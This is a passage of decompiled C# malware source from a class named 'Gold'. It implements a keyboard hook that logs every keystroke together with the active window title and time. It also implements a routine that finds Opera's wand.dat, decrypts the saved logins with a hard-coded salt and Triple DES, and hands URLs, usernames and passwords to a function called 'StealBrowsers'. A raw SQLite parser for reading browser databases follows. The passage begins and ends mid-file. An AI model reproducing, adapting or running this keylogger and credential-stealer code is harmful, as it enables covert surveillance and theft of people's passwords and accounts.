    [DllImport("kernel32", EntryPoint = "GetModuleHandleA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.VBByRefStr)] ref string moduleName);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SizeofResource(IntPtr hModule, IntPtr hResInfo);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr LoadResource(IntPtr hModule, IntPtr hResInfo);

    public static byte[] ReadResource(string filename)
    {
      IntPtr moduleHandle = Gold.Gold.GetModuleHandle(ref filename);
      IntPtr resource = Gold.Gold.FindResource(moduleHandle, "0", "RT_RCDATA");
      IntPtr source = Gold.Gold.LoadResource(moduleHandle, resource);
      int length = Gold.Gold.SizeofResource(moduleHandle, resource);
      byte[] destination = new byte[checked (length - 1 + 1)];
      Marshal.Copy(source, destination, 0, length);
      return destination;
    }

    private static Gold.Gold.KeyboardHook KH
    {
      get => Gold.Gold._KH;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        Gold.Gold.KeyboardHook.KeyDownEventHandler downEventHandler = new Gold.Gold.KeyboardHook.KeyDownEventHandler(Gold.Gold.KH_KeyDown);
        if (Gold.Gold._KH != null)
          Gold.Gold.KeyboardHook.KeyDown -= downEventHandler;
        Gold.Gold._KH = value;
        if (Gold.Gold._KH == null)
          return;
        Gold.Gold.KeyboardHook.KeyDown += downEventHandler;
      }
    }

    private static void KH_KeyDown(Keys e)
    {
      if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Gold.Gold.GetKey(e), (string) null, false) == 0)
        return;
      if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Gold.Gold.strin, Gold.Gold.GetActiveWindowTitle(), false) != 0)
      {
        Gold.Gold.Keylogs = Gold.Gold.Keylogs + "\r\n[-----" + Gold.Gold.GetActiveWindowTitle() + " @ " + Conversions.ToString(DateTime.Now) + " -----] \r\n";
        Gold.Gold.strin = Gold.Gold.GetActiveWindowTitle();
      }
      Gold.Gold.Keylogs += Gold.Gold.GetKey(e);
    }

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetForegroundWindow();

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowText(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

    private static string GetActiveWindowTitle()
    {
      string lpString = new string(char.MinValue, 100);
      Gold.Gold.GetWindowText(Gold.Gold.GetForegroundWindow(), ref lpString, 100);
      return lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
    }

    public static string GetKey(Keys e)
    {
      bool capsLock = MyProject.Computer.Keyboard.CapsLock;
      bool shiftKeyDown = MyProject.Computer.Keyboard.ShiftKeyDown;
      switch (e)
      {
        case Keys.Back:
          return "[BS]";
        case Keys.Tab:
          return "        ";
        case Keys.Return:
          return "\r\n";
        case Keys.Escape:
          return "[ESC]";
        case Keys.Space:
          return " ";
        case Keys.D0:
        case Keys.D1:
        case Keys.D2:
        case Keys.D3:
        case Keys.D4:
        case Keys.D5:
        case Keys.D6:
        case Keys.D7:
        case Keys.D8:
        case Keys.D9:
          return !shiftKeyDown ? Conversions.ToString(Strings.Chr((int) e)) : Conversions.ToString(")!@#$%^&*("[(int) (e - 48)]);
        case Keys.A:
        case Keys.B:
        case Keys.C:
        case Keys.D:
        case Keys.E:
        case Keys.F:
        case Keys.G:
        case Keys.H:
        case Keys.I:
        case Keys.J:
        case Keys.K:
        case Keys.L:
        case Keys.M:
        case Keys.N:
        case Keys.O:
        case Keys.P:
        case Keys.Q:
        case Keys.R:
        case Keys.S:
        case Keys.T:
        case Keys.U:
        case Keys.V:
        case Keys.W:
        case Keys.X:
        case Keys.Y:
        case Keys.Z:
          return capsLock ? (shiftKeyDown ? Conversions.ToString(Strings.LCase(Strings.Chr((int) e))) : Conversions.ToString(Strings.Chr((int) e))) : (shiftKeyDown ? Conversions.ToString(Strings.Chr((int) e)) : Conversions.ToString(Strings.LCase(Strings.Chr((int) e))));
        case Keys.NumPad0:
        case Keys.NumPad1:
        case Keys.NumPad2:
        case Keys.NumPad3:
        case Keys.NumPad4:
        case Keys.NumPad5:
        case Keys.NumPad6:
        case Keys.NumPad7:
        case Keys.NumPad8:
        case Keys.NumPad9:
          return Conversions.ToString(Strings.Chr((int) (e - 48)));
        case Keys.Multiply:
          return "*";
        case Keys.Add:
          return "+";
        case Keys.Subtract:
          return "-";
        case Keys.Decimal:
          return ".";
        case Keys.Divide:
          return "/";
        case Keys.F1:
          return "[F1]";
        case Keys.F2:
          return "[F2]";
        case Keys.F3:
          return "[F3]";
        case Keys.F4:
          return "[F4]";
        case Keys.F5:
          return "[F5]";
        case Keys.F6:
          return "[F6]";
        case Keys.F7:
          return "[F7]";
        case Keys.F8:
          return "[F8]";
        case Keys.F9:
          return "[F9]";
        case Keys.F10:
          return "[F10]";
        case Keys.F11:
          return "[F11]";
        case Keys.F12:
          return "[F12]";
        case Keys.OemSemicolon:
          return shiftKeyDown ? ":" : ";";
        case Keys.Oemplus:
          return shiftKeyDown ? "+" : "=";
        case Keys.Oemcomma:
          return shiftKeyDown ? "<" : ",";
        case Keys.OemMinus:
          return shiftKeyDown ? "_" : "-";
        case Keys.OemPeriod:
          return shiftKeyDown ? ">" : ".";
        case Keys.OemQuestion:
          return shiftKeyDown ? "?" : "/";
        case Keys.Oemtilde:
          return shiftKeyDown ? "~" : "`";
        case Keys.OemOpenBrackets:
          return shiftKeyDown ? "{" : "[";
        case Keys.OemPipe:
          return shiftKeyDown ? "|" : "\\";
        case Keys.OemCloseBrackets:
          return shiftKeyDown ? "}" : "]";
        case Keys.OemQuotes:
          return shiftKeyDown ? "\"" : "'";
        default:
          return "";
      }
    }

    private struct CREDENTIAL
    {
      public IntPtr dwFlags;
      public IntPtr dwType;
      public IntPtr lpstrTargetName;
      public IntPtr lpstrComment;
      public System.Runtime.InteropServices.ComTypes.FILETIME ftLastWritten;
      public IntPtr dwCredentialBlobSize;
      public IntPtr lpbCredentialBlob;
      public IntPtr dwPersist;
      public IntPtr dwAttributeCount;
      public IntPtr lpAttributes;
      public IntPtr lpstrTargetAlias;
      public IntPtr lpUserName;
    }

    private struct DATA_BLOB
    {
      public IntPtr cbData;
      public IntPtr pbData;
    }

    public class Opera
    {
      private static byte[] opera_salt = new byte[11]
      {
        (byte) 131,
        (byte) 125,
        (byte) 252,
        (byte) 15,
        (byte) 142,
        (byte) 179,
        (byte) 232,
        (byte) 105,
        (byte) 115,
        (byte) 175,
        byte.MaxValue
      };
      private static byte[] key_size = new byte[4]
      {
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 8
      };
      private static string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      public string DOutput;
      private int c;
      private int c1;
      private int c2;
      private bool firstrun;
      private string ReturnValue;
      private string sUrlTemp;
      private string sUserTemp;
      private string sPassTemp;
      private string[] sUrl;
      private string[] sUser;
      private string[] sPass;
      private int lasturl;
      private bool ftp;
      private string[] Lines;
      private string[] LoginData;

      public Opera()
      {
        this.c = 0;
        this.c1 = 0;
        this.c2 = 0;
        this.firstrun = true;
        this.sUrl = new string[1001];
        this.sUser = new string[1001];
        this.sPass = new string[1001];
        this.lasturl = 0;
        this.ftp = false;
        this.LoginData = new string[3001];
      }

      public object GetOpera()
      {
        if (System.IO.File.Exists(Gold.Gold.Opera.path + "\\Opera\\Opera\\wand.dat"))
        {
          Gold.Gold.Opera.path += "\\Opera\\Opera\\wand.dat";
          this.version2();
        }
        else if (System.IO.File.Exists(Gold.Gold.Opera.path + "\\Opera\\Opera\\profile\\wand.dat"))
        {
          Gold.Gold.Opera.path += "\\Opera\\Opera\\profile\\wand.dat";
          this.version2();
        }
        return (object) this.LoginData;
      }

      private void version2()
      {
        try
        {
          byte[] sourceArray = System.IO.File.ReadAllBytes(Gold.Gold.Opera.path);
          int num1 = checked (sourceArray.Length - 5);
          int index1 = 0;
          while (index1 <= num1)
          {
            if (sourceArray[index1] == (byte) 0 && sourceArray[checked (index1 + 1)] == (byte) 0 && sourceArray[checked (index1 + 2)] == (byte) 0 && sourceArray[checked (index1 + 3)] == (byte) 8)
            {
              int num2 = (int) sourceArray[checked (index1 + 15)];
              byte[] numArray1 = new byte[8];
              byte[] numArray2 = new byte[checked (num2 - 1 + 1)];
              Array.Copy((Array) sourceArray, checked (index1 + 4), (Array) numArray1, 0, numArray1.Length);
              Array.Copy((Array) sourceArray, checked (index1 + 16), (Array) numArray2, 0, numArray2.Length);
              this.DOutput = Conversions.ToString(Microsoft.VisualBasic.CompilerServices.Operators.AddObject((object) this.DOutput, Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject(this.decrypt2_method(numArray1, numArray2), (object) "\r\n")));
              checked { index1 += 11 + num2; }
            }
            checked { ++index1; }
          }
          this.Lines = this.DOutput.Split(Conversions.ToChar(Environment.NewLine));
          int index2 = 0;
          do
          {
            this.Lines[index2] = (string) null;
            checked { ++index2; }
          }
          while (index2 <= 3);
          int num3 = checked (this.Lines.Length - 1);
          int index3 = 0;
          while (index3 <= num3)
          {
            this.sUrlTemp = (string) null;
            this.sUserTemp = (string) null;
            this.sPassTemp = (string) null;
            this.c = 0;
            try
            {
              if (this.Lines[index3].Contains("http://") || this.Lines[index3].Contains("https://") || this.Lines[index3].Contains("ftp://"))
              {
                if (index3 != 0)
                {
                  try
                  {
                    int num4 = checked (this.Lines[index3].Length - 1);
                    int num5 = 0;
                    while (num5 <= num4)
                    {
                      if (this.Lines[index3][checked (num5 - this.c)] > '\u007F')
                      {
                        this.Lines[index3] = this.Lines[index3].Remove(checked (num5 - this.c), 1);
                        checked { ++this.c; }
                      }
                      checked { ++num5; }
                    }
                    if (checked (index3 - this.lasturl) == 1)
                      this.sUrlTemp = this.Lines[index3];
                    else if (checked (index3 - this.lasturl) == 2)
                      this.sUrlTemp = this.Lines[index3];
                    if (this.Lines[index3].Contains("ftp://"))
                      this.sUrlTemp = this.Lines[index3];
                    this.lasturl = index3;
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    ProjectData.ClearProjectError();
                  }
                }
              }
              else if (this.ftp)
              {
                if (checked (index3 - this.lasturl) != 1)
                {
                  if (checked (index3 - this.lasturl) != 2)
                    goto label_51;
                }
                try
                {
                  int num6 = checked (this.Lines[index3].Length - 1);
                  int num7 = 0;
                  while (num7 <= num6)
                  {
                    if (this.Lines[index3][checked (num7 - this.c)] > '\u007F')
                    {
                      this.Lines[index3] = this.Lines[index3].Remove(checked (num7 - this.c), 1);
                      checked { ++this.c; }
                    }
                    checked { ++num7; }
                  }
                  if (checked (index3 - this.lasturl) == 1)
                    this.sUserTemp = this.Lines[index3];
                  else if (checked (index3 - this.lasturl) == 2)
                  {
                    this.sPassTemp = this.Lines[index3];
                    checked { ++this.c1; }
                    this.ftp = false;
                  }
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                }
              }
              else if (this.lasturl != 0)
              {
                if (index3 != checked (this.lasturl + 2))
                {
                  if (index3 != checked (this.lasturl + 4))
                    goto label_51;
                }
                try
                {
                  int num8 = checked (this.Lines[index3].Length - 1);
                  int num9 = 0;
                  while (num9 <= num8)
                  {
                    if (this.Lines[index3][checked (num9 - this.c)] > '\u007F')
                    {
                      this.Lines[index3] = this.Lines[index3].Remove(checked (num9 - this.c), 1);
                      checked { ++this.c; }
                    }
                    checked { ++num9; }
                  }
                  if (index3 == checked (this.lasturl + 2))
                    this.sUserTemp = this.Lines[index3];
                  else if (index3 == checked (this.lasturl + 4))
                    this.sPassTemp = this.Lines[index3];
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                }
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
label_51:
            try
            {
              if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(this.sUrlTemp, (string) null, false) != 0)
              {
                this.sUrlTemp = this.sUrlTemp.Replace("\n", "");
                this.sUrl[this.c1] = this.sUrlTemp;
              }
              if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(this.sUserTemp, (string) null, false) != 0)
              {
                this.sUserTemp = this.sUserTemp.Replace("\n", "");
                this.sUser[this.c1] = this.sUserTemp;
              }
              if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(this.sPassTemp, (string) null, false) != 0)
              {
                try
                {
                  this.sPassTemp = this.sPassTemp.Replace("\n", "");
                  this.sPass[this.c1] = this.sPassTemp;
                  Gold.Gold.StealBrowsers(nameof (Opera), this.sUrl[this.c1], this.sUser[this.c1], this.sPass[this.c1]);
                  checked { ++this.c1; }
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                }
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            checked { ++index3; }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        int num = checked (this.sUrl.Length - 1);
        int index = 0;
        while (index <= num && Microsoft.VisualBasic.CompilerServices.Operators.CompareString(this.sUrl[index], "", false) != 0)
        {
          this.LoginData[this.c2] = this.sUrl[index];
          this.LoginData[checked (this.c2 + 1)] = this.sUser[index];
          this.LoginData[checked (this.c2 + 2)] = this.sPass[index];
          checked { this.c2 += 3; }
          checked { ++index; }
        }
      }

      public object decrypt2_method(byte[] key, byte[] encrypt_data)
      {
        object obj;
        try
        {
          MD5CryptoServiceProvider cryptoServiceProvider1 = new MD5CryptoServiceProvider();
          cryptoServiceProvider1.Initialize();
          byte[] numArray1 = new byte[checked (Gold.Gold.Opera.opera_salt.Length + (key.Length - 1) + 1)];
          Array.Copy((Array) Gold.Gold.Opera.opera_salt, (Array) numArray1, Gold.Gold.Opera.opera_salt.Length);
          Array.Copy((Array) key, 0, (Array) numArray1, Gold.Gold.Opera.opera_salt.Length, key.Length);
          byte[] hash1 = cryptoServiceProvider1.ComputeHash(numArray1);
          byte[] numArray2 = new byte[checked (hash1.Length + Gold.Gold.Opera.opera_salt.Length + (key.Length - 1) + 1)];
          Array.Copy((Array) hash1, (Array) numArray2, hash1.Length);
          Array.Copy((Array) Gold.Gold.Opera.opera_salt, 0, (Array) numArray2, hash1.Length, Gold.Gold.Opera.opera_salt.Length);
          Array.Copy((Array) key, 0, (Array) numArray2, checked (hash1.Length + Gold.Gold.Opera.opera_salt.Length), key.Length);
          byte[] hash2 = cryptoServiceProvider1.ComputeHash(numArray2);
          TripleDESCryptoServiceProvider cryptoServiceProvider2 = new TripleDESCryptoServiceProvider();
          cryptoServiceProvider2.Mode = CipherMode.CBC;
          cryptoServiceProvider2.Padding = PaddingMode.None;
          byte[] destinationArray1 = new byte[24];
          byte[] destinationArray2 = new byte[8];
          Array.Copy((Array) hash1, (Array) destinationArray1, hash1.Length);
          Array.Copy((Array) hash2, 0, (Array) destinationArray1, hash1.Length, 8);
          Array.Copy((Array) hash2, 8, (Array) destinationArray2, 0, 8);
          cryptoServiceProvider2.Key = destinationArray1;
          cryptoServiceProvider2.IV = destinationArray2;
          obj = (object) Encoding.Unicode.GetString(cryptoServiceProvider2.CreateDecryptor().TransformFinalBlock(encrypt_data, 0, encrypt_data.Length));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          obj = (object) "";
          ProjectData.ClearProjectError();
        }
        return obj;
      }
    }

    [System.Flags]
    public enum CryptProtectPromptFlags
    {
      CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1,
      CRYPTPROTECT_PROMPT_ON_PROTECT = 2,
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct CRYPTPROTECT_PROMPTSTRUCT
    {
      public int cbSize;
      public Gold.Gold.CryptProtectPromptFlags dwPromptFlags;
      public IntPtr hwndApp;
      public string szPrompt;
    }

    public class SQLiteBase
    {
      private const int SQL_OK = 0;
      private const int SQL_ROW = 100;
      private const int SQL_DONE = 101;
      private IntPtr database;

      [DllImport("kernel32")]
      private static extern IntPtr HeapAlloc(IntPtr heap, uint flags, uint bytes);

      [DllImport("kernel32")]
      private static extern IntPtr GetProcessHeap();

      [DllImport("kernel32")]
      private static extern int lstrlen(IntPtr str);

      [DllImport("sqlite3")]
      private static extern int sqlite3_open(IntPtr fileName, ref IntPtr database);

      [DllImport("sqlite3")]
      private static extern int sqlite3_close(IntPtr database);

      [DllImport("sqlite3")]
      private static extern int sqlite3_exec(
        IntPtr database,
        IntPtr query,
        IntPtr callback,
        IntPtr arguments,
        ref IntPtr error);

      [DllImport("sqlite3")]
      private static extern IntPtr sqlite3_errmsg(IntPtr database);

      [DllImport("sqlite3")]
      private static extern int sqlite3_prepare_v2(
        IntPtr database,
        IntPtr query,
        int length,
        ref IntPtr statement,
        ref IntPtr tail);

      [DllImport("sqlite3")]
      private static extern int sqlite3_step(IntPtr statement);

      [DllImport("sqlite3")]
      private static extern int sqlite3_column_count(IntPtr statement);

      [DllImport("sqlite3")]
      private static extern IntPtr sqlite3_column_name(IntPtr statement, int columnNumber);

      [DllImport("sqlite3")]
      private static extern int sqlite3_column_type(IntPtr statement, int columnNumber);

      [DllImport("sqlite3")]
      private static extern int sqlite3_column_int(IntPtr statement, int columnNumber);

      [DllImport("sqlite3")]
      private static extern double sqlite3_column_double(IntPtr statement, int columnNumber);

      [DllImport("sqlite3")]
      private static extern IntPtr sqlite3_column_text(IntPtr statement, int columnNumber);

      [DllImport("sqlite3")]
      private static extern IntPtr sqlite3_column_blob(IntPtr statement, int columnNumber);

      [DllImport("sqlite3")]
      private static extern IntPtr sqlite3_column_table_name(
        IntPtr statement,
        int columnNumber);

      [DllImport("sqlite3")]
      private static extern int sqlite3_finalize(IntPtr handle);

      public SQLiteBase() => this.database = IntPtr.Zero;

      public SQLiteBase(string baseName) => this.OpenDatabase(baseName);

      public void OpenDatabase(string baseName)
      {
        if (Gold.Gold.SQLiteBase.sqlite3_open(this.StringToPointer(baseName), ref this.database) != 0)
        {
          this.database = IntPtr.Zero;
          throw new Exception("Error with opening database " + baseName + "!");
        }
      }

      public void CloseDatabase()
      {
        if (!(this.database != IntPtr.Zero))
          return;
        Gold.Gold.SQLiteBase.sqlite3_close(this.database);
      }

      public ArrayList GetTables()
      {
        DataTable dataTable = this.ExecuteQuery("SELECT name FROM sqlite_master WHERE type IN ('table','view') AND name NOT LIKE 'sqlite_%'UNION ALL SELECT name FROM sqlite_temp_master WHERE type IN ('table','view') ORDER BY 1");
        ArrayList tables = new ArrayList();
        try
        {
          foreach (DataRow row in dataTable.Rows)
            tables.Add((object) row.ItemArray[0].ToString());
        }
        finally
        {
          System.Collections.IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
        return tables;
      }

      public void ExecuteNonQuery(string query)
      {
        IntPtr error;
        Gold.Gold.SQLiteBase.sqlite3_exec(this.database, this.StringToPointer(query), IntPtr.Zero, IntPtr.Zero, ref error);
        if (error != IntPtr.Zero)
          throw new Exception("Error with executing non-query: \"" + query + "\"!\n" + this.PointerToString(Gold.Gold.SQLiteBase.sqlite3_errmsg(error)));
      }

      public DataTable ExecuteQuery(string query)
      {
        IntPtr statement;
        IntPtr tail;
        Gold.Gold.SQLiteBase.sqlite3_prepare_v2(this.database, this.StringToPointer(query), this.GetPointerLenght(this.StringToPointer(query)), ref statement, ref tail);
        DataTable table = new DataTable();
        int num = this.ReadFirstRow(statement, ref table);
        while (num == 100)
          num = this.ReadNextRow(statement, ref table);
        Gold.Gold.SQLiteBase.sqlite3_finalize(statement);
        return table;
      }

      private int ReadFirstRow(IntPtr statement, ref DataTable table)
      {
        table = new DataTable("resultTable");
        if (Gold.Gold.SQLiteBase.sqlite3_step(statement) == 100)
        {
          int num1 = Gold.Gold.SQLiteBase.sqlite3_column_count(statement);
          object[] objArray = new object[checked (num1 - 1 + 1)];
          int num2 = checked (num1 - 1);
          int columnNumber = 0;
          while (columnNumber <= num2)
          {
            string columnName = this.PointerToString(Gold.Gold.SQLiteBase.sqlite3_column_name(statement, columnNumber));
            switch (Gold.Gold.SQLiteBase.sqlite3_column_type(statement, columnNumber))
            {
              case 1:
                table.Columns.Add(columnName, System.Type.GetType("System.Int32"));
                objArray[columnNumber] = (object) Gold.Gold.SQLiteBase.sqlite3_column_int(statement, columnNumber);
                break;
              case 2:
                table.Columns.Add(columnName, System.Type.GetType("System.Single"));
                objArray[columnNumber] = (object) Gold.Gold.SQLiteBase.sqlite3_column_double(statement, columnNumber);
                break;
              case 3:
                table.Columns.Add(columnName, System.Type.GetType("System.String"));
                objArray[columnNumber] = (object) this.PointerToString(Gold.Gold.SQLiteBase.sqlite3_column_text(statement, columnNumber));
                break;
              case 4:
                table.Columns.Add(columnName, System.Type.GetType("System.String"));
                objArray[columnNumber] = (object) this.PointerToString(Gold.Gold.SQLiteBase.sqlite3_column_blob(statement, columnNumber));
                break;
              default:
                table.Columns.Add(columnName, System.Type.GetType("System.String"));
                objArray[columnNumber] = (object) "";
                break;
            }
            checked { ++columnNumber; }
          }
          table.Rows.Add(objArray);
        }
        return Gold.Gold.SQLiteBase.sqlite3_step(statement);
      }

      private int ReadNextRow(IntPtr statement, ref DataTable table)
      {
        int num1 = Gold.Gold.SQLiteBase.sqlite3_column_count(statement);
        object[] objArray = new object[checked (num1 - 1 + 1)];
        int num2 = checked (num1 - 1);
        int columnNumber = 0;
        while (columnNumber <= num2)
        {
          switch (Gold.Gold.SQLiteBase.sqlite3_column_type(statement, columnNumber))
          {
            case 1:
              objArray[columnNumber] = (object) Gold.Gold.SQLiteBase.sqlite3_column_int(statement, columnNumber);
              break;
            case 2:
              objArray[columnNumber] = (object) Gold.Gold.SQLiteBase.sqlite3_column_double(statement, columnNumber);
              break;
            case 3:
              objArray[columnNumber] = (object) this.PointerToString(Gold.Gold.SQLiteBase.sqlite3_column_text(statement, columnNumber));
              break;
            case 4:
              objArray[columnNumber] = (object) this.PointerToString(Gold.Gold.SQLiteBase.sqlite3_column_blob(statement, columnNumber));
              break;
            default:
              objArray[columnNumber] = (object) "";
              break;
          }
          checked { ++columnNumber; }
        }
        table.Rows.Add(objArray);
        return Gold.Gold.SQLiteBase.sqlite3_step(statement);
      }

      private IntPtr StringToPointer(string str)
      {
        if (str == null)
          return IntPtr.Zero;
        byte[] bytes1 = Encoding.UTF8.GetBytes(str);
        uint bytes2 = checked ((uint) (bytes1.Length + 1));
        IntPtr pointer = Gold.Gold.SQLiteBase.HeapAlloc(Gold.Gold.SQLiteBase.GetProcessHeap(), 0U, bytes2);
        Marshal.Copy(bytes1, 0, pointer, bytes1.Length);
        Marshal.WriteByte(pointer, bytes1.Length, (byte) 0);
        return pointer;
      }

      private string PointerToString(IntPtr ptr)
      {
        if (ptr == IntPtr.Zero)
          return (string) null;
        Encoding utF8 = Encoding.UTF8;
        int pointerLenght = this.GetPointerLenght(ptr);
        byte[] numArray = new byte[checked (pointerLenght - 1 + 1)];
        Marshal.Copy(ptr, numArray, 0, pointerLenght);
        return utF8.GetString(numArray, 0, pointerLenght);
      }

      private int GetPointerLenght(IntPtr ptr) => ptr == IntPtr.Zero ? 0 : Gold.Gold.SQLiteBase.lstrlen(ptr);

      public enum SQLiteDataTypes
      {
        INT = 1,
        FLOAT = 2,
        TEXT = 3,
        BLOB = 4,
        NULL = 5,
      }
    }

    public class SQLiteHandler
    {
      private byte[] db_bytes;
      private ushort page_size;
      private ulong encoding;
      private Gold.Gold.SQLiteHandler.sqlite_master_entry[] master_table_entries;
      private byte[] SQLDataTypeSize;
      private Gold.Gold.SQLiteHandler.table_entry[] table_entries;
      private string[] field_names;

      private int GVL(int startIndex)
      {
        if (startIndex > this.db_bytes.Length)
          return 0;
        int num1 = startIndex;
        int num2 = checked (startIndex + 8);
        int index = num1;
        while (index <= num2)
        {
          if (index > checked (this.db_bytes.Length - 1))
            return 0;
          if (((int) this.db_bytes[index] & 128) != 128)
            return index;
          checked { ++index; }
        }
        return checked (startIndex + 8);
      }

      private long CVL(int startIndex, int endIndex)
      {
        checked { ++endIndex; }
        byte[] numArray = new byte[8];
        int num1 = checked (endIndex - startIndex);
        bool flag = false;
        if (num1 == 0 | num1 > 9)
          return 0;
        switch (num1)
        {
          case 1:
            numArray[0] = checked ((byte) ((int) this.db_bytes[startIndex] & (int) sbyte.MaxValue));
            return BitConverter.ToInt64(numArray, 0);
          case 9:
            flag = true;
            break;
        }
        int num2 = 1;
        int num3 = 7;
        int index1 = 0;
        if (flag)
        {
          numArray[0] = this.db_bytes[checked (endIndex - 1)];
          checked { --endIndex; }
          index1 = 1;
        }
        int num4 = checked (endIndex - 1);
        int num5 = startIndex;
        int index2 = num4;
        while (index2 >= num5)
        {
          if (checked (index2 - 1) >= startIndex)
          {
            numArray[index1] = checked ((byte) ((int) unchecked ((byte) ((uint) this.db_bytes[index2] >> (checked (num2 - 1) & 7))) & (int) byte.MaxValue >> num2 | (int) unchecked ((byte) ((uint) this.db_bytes[checked (index2 - 1)] << (num3 & 7)))));
            checked { ++num2; }
            checked { ++index1; }
            checked { --num3; }
          }
          else if (!flag)
            numArray[index1] = checked ((byte) ((int) unchecked ((byte) ((uint) this.db_bytes[index2] >> (checked (num2 - 1) & 7))) & (int) byte.MaxValue >> num2));
          checked { index2 += -1; }
        }
        return BitConverter.ToInt64(numArray, 0);
      }

      private bool IsOdd(long value) => (value & 1L) == 1L;

      private ulong ConvertToInteger(int startIndex, int Size)
      {
        if (Size > 8 | Size == 0)
          return 0;
        ulong integer = 0;
        int num1 = checked (Size - 1);
        int num2 = 0;
        while (num2 <= num1)
        {
          integer = integer << 8 | (ulong) this.db_bytes[checked (startIndex + num2)];
          checked { ++num2; }
        }
        return integer;
      }

      private void ReadMasterTable(ulong Offset)
      {
        if (this.db_bytes[checked ((int) Offset)] == (byte) 13)
        {
          ushort uint16 = Convert.ToUInt16(Decimal.Subtract(new Decimal(this.ConvertToInteger(Convert.ToInt32(Decimal.Add(new Decimal(Offset), 3M)), 2)), 1M));
          int num1 = 0;
          if (this.master_table_entries != null)
          {
            num1 = this.master_table_entries.Length;
            this.master_table_entries = (Gold.Gold.SQLiteHandler.sqlite_master_entry[]) Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array) this.master_table_entries, (Array) new Gold.Gold.SQLiteHandler.sqlite_master_entry[checked (this.master_table_entries.Length + (int) uint16 + 1)]);
          }
          else
            this.master_table_entries = new Gold.Gold.SQLiteHandler.sqlite_master_entry[checked ((int) uint16 + 1)];
          int num2 = (int) uint16;
          int num3 = 0;
          while (num3 <= num2)
          {
            ulong integer = this.ConvertToInteger(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(Offset), 8M), new Decimal(checked (num3 * 2)))), 2);
            if (Decimal.Compare(new Decimal(Offset), 100M) != 0)
              checked { integer += Offset; }
            int endIndex1 = this.GVL(checked ((int) integer));
            this.CVL(checked ((int) integer), endIndex1);
            int endIndex2 = this.GVL(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(integer), Decimal.Subtract(new Decimal(endIndex1), new Decimal(integer))), 1M)));
            this.master_table_entries[checked (num1 + num3)].row_id = this.CVL(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(integer), Decimal.Subtract(new Decimal(endIndex1), new Decimal(integer))), 1M)), endIndex2);
            ulong uint64 = Convert.ToUInt64(Decimal.Add(Decimal.Add(new Decimal(integer), Decimal.Subtract(new Decimal(endIndex2), new Decimal(integer))), 1M));
            int endIndex3 = this.GVL(checked ((int) uint64));
            int endIndex4 = endIndex3;
            long num4 = this.CVL(checked ((int) uint64), endIndex3);
            long[] numArray = new long[5];
            int index = 0;
            do
            {
              int startIndex = checked (endIndex4 + 1);
              endIndex4 = this.GVL(startIndex);
              numArray[index] = this.CVL(startIndex, endIndex4);
              numArray[index] = numArray[index] <= 9L ? (long) this.SQLDataTypeSize[checked ((int) numArray[index])] : (!this.IsOdd(numArray[index]) ? checked ((long) Math.Round(unchecked ((double) checked (numArray[index] - 12L) / 2.0))) : checked ((long) Math.Round(unchecked ((double) checked (numArray[index] - 13L) / 2.0))));
              checked { ++index; }
            }
            while (index <= 4);
            if (Decimal.Compare(new Decimal(this.encoding), 1M) == 0)
              this.master_table_entries[checked (num1 + num3)].item_type = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(Decimal.Add(new Decimal(uint64), new Decimal(num4))), checked ((int) numArray[0]));
            else if (Decimal.Compare(new Decimal(this.encoding), 2M) == 0)
              this.master_table_entries[checked (num1 + num3)].item_type = Encoding.Unicode.GetString(this.db_bytes, Convert.ToInt32(Decimal.Add(new Decimal(uint64), new Decimal(num4))), checked ((int) numArray[0]));
            else if (Decimal.Compare(new Decimal(this.encoding), 3M) == 0)
              this.master_table_entries[checked (num1 + num3)].item_type = Encoding.BigEndianUnicode.GetString(this.db_bytes, Convert.ToInt32(Decimal.Add(new Decimal(uint64), new Decimal(num4))), checked ((int) numArray[0]));
            if (Decimal.Compare(new Decimal(this.encoding), 1M) == 0)
              this.master_table_entries[checked (num1 + num3)].item_name = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num4)), new Decimal(numArray[0]))), checked ((int) numArray[1]));
            else if (Decimal.Compare(new Decimal(this.encoding), 2M) == 0)
